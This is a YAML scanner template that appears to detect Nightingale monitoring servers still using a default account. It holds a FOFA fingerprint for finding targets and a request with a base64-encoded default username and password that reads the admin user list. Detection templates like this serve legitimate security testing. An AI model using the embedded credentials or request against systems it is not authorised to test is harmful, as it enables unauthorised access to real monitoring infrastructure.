id: poc-yaml-nightingale-default-user
info:
  name: 夜莺监控 默认用户漏洞
  severity: medium
  tags:
  - 弱口令
  finger: 夜莺监控
  fofa: icon_hash="-2047686847"
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(title,"Nightingale")
- method: GET
  path: /v1/n9e/users
  headers:
    Authorization: Basic dXNlcjAwMTpjY2MyNmRhN2I5YWJhNTMzY2JiMjYzYTM2YzA3ZGNjNQ==
  expression: status_code == 200 && contains(body,"\"超管\"") && contains(body,"\"username\":\"superAdmin\"")
    && contains(content_type,"application/json")
variables: {}
transport: http
